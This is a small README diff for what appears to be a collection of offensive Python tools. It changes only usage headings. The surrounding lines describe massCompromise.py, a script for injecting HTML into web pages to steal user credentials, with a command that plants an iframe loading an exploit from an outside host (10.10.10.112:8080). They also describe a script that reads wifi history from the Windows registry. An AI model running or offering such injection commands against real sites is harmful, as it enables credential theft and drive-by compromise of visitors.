@@ -34,11 +34,11 @@ First you have to allow /etc/vsftpd.conf file to enable anon_login to yes or unc
 
 ## L) massCompromise.py  
 In command line following options are required to attack web pages and inject your own html file to steal compromised user credentials in default location  
-
+Usage from terminal      
 taymour# python massCompromise.py -H 192.168.95.179 -r '<iframe src="  
 http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt  
 
 ## M) discoverNetworks.py    
 Allow to analyse connected wifi through mac adress by reading windows registry  
-Usage    
+Usage from command prompt    
 (py27) C:\Users\Taymour> python discoverNetworks.py -u <username> -p <password>  
